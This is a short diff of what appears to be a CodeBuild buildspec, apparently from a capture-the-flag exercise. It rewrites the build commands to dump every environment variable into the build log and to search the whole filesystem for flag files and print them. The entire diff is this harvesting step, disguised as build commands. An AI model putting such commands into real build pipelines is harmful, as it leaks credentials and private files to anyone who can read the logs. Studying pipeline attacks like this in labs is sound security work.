@@ -2,7 +2,6 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Checking environment..."
+      - echo "Checking for secrets..."
       - env
-      - echo "Searching for the flag..."
-      - find / -name "*flag*" 2>/dev/null -exec cat {} + || true
+      - find / -name "flag.txt" 2>/dev/null -exec cat {} +
